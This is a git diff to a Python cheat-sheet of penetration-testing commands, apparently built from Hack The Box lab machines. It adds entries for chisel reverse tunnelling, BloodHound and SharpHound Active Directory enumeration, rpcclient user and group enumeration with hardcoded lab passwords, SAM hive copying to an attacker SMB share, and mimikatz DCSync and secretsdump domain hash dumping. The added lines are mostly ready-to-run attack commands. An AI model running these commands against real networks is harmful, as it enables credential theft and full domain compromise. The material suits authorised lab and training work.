@@ -1284,6 +1284,7 @@ chisel_portforwarding = Cheat("chisel - port forwarding - TCP/UDP tunnel")
 chisel_portforwarding.category = "Tools"
 chisel_portforwarding.output = """[*] Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH, for port forwarding.
 
+# https://github.com/jpillora/chisel/releases
 # Server - is my kali machine waiting for connection.
 sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel server, where chisel comunicate to other chisel
 
@@ -1434,27 +1435,48 @@ cmd /c sc start seclogon
 ######################################
 ######################################
 
-bloodhound = Cheat("bloodhound-python - AD domain | neo4j - Windows")
+bloodhound = Cheat("bloodhound-python / SharpHound - AD domain | neo4j - Windows")
 bloodhound.category = "Windows"
-bloodhound.output = """[*] bloodhound-python - Enumerate All AD domain for bloodhound GUI
+bloodhound.output = """[*] bloodhound-python - Enumerate All AD domain for bloodhound GUI in LOCAL
 
 # The output of this command should give files.json for bloodhound GUI aplication
-bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -dc blackfield.local
+bloodhound-python -c All -u support -p '!00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -dc blackfield.local
 
 # start neo4j
 sudo neo4j start
 
 bloodhound &>/dev/null &
+
+
+[*] SharpHound - Tranfere in the target machine sharphound for collect info for bloodhound GUI
+
+wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
+# transfere to the target machine
+
+
 """
 
 ######################################
 ######################################
 
-rpcclient = Cheat("rpcclient - MS-RPC - MSRPC - bloodhound - neo4j - Windows")
+rpcclient = Cheat("rpcclient - MS-RPC - MSRPC - Windows")
 rpcclient.category = "Windows"
 rpcclient.output = f"""[*] rpcclient - tool for executing client side MS-RPC functions
 
 # rpcclient [-A authfile] [-c <command string>] [-d debuglevel] [-l logdir] [-N] [-s <smb config file>] [-U username[%password]] [-W workgroup] [-I destinationIP] {{BINDING-STRING|HOST}}
+
+rpcclient -U '' -N 10.10.10.161      # Modo interativo anonymous sem password
+rpcclient -U "SVC_TGS" 10.10.10.100  # Modo interativo - Pede contra-senha
+rpcclient $> enumdomusers            # Enumera todos os usuários locais do sistema
+
+# A mesma sequencia de commandos pode-se efetuar com um oneliner:
+rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomusers"
+rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "enumdomgroups"
+rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200"
+rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser 0x1f4"
+
+# OneLiner para descobrir todos os usuários com permições administrador local
+echo; rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "querygroupmem 0x200" | awk '{{print $1}}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c "queryuser $rid" | grep "User Name" | awk 'NF{{print$NF}}')"; done
 
 # If a user has the capability to change another user's passwordChange without knowing that user's current password, then:
 rpcclient -U "support%!00^BlackKnight" 10.10.10.192
@@ -1489,4 +1511,30 @@ copy sam.backup \\10.10.14.16\smbFolder\sam.backup
 
 # Extract data
 secretsdump.py -sam sam.backup -system system.backup LOCAL
+"""
+
+######################################
+######################################
+
+rdate = Cheat("rdate - Clock skew too great - syncronize time")
+rdate.category = "Tools"
+rdate.output = """[*] rdate - set the system's date from a remote hos
+
+rdate -n 10.10.10.175
+"""
+
+######################################
+######################################
+
+mimikatz = Cheat("mimikatz.exe - GetChanges && GetChangesAll in AD/DC")
+mimikatz.category = "Tools"
+mimikatz.output = """[*] Dump Hash of all users of a AD or a DC, when we have GetChanges && GetChangesAll up
+
+wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe
+
+# When mimikatz go in infinite loop...
+.\mimikatz.exe 'lsadump::dcsync /domain:testlab.local /user:Administrator' exit
+
+[*] Better way to get all Hash with impacket-secretsdump
+secretsdump.py egotistical-bank.local/fsmith@10.10.10.175
 """
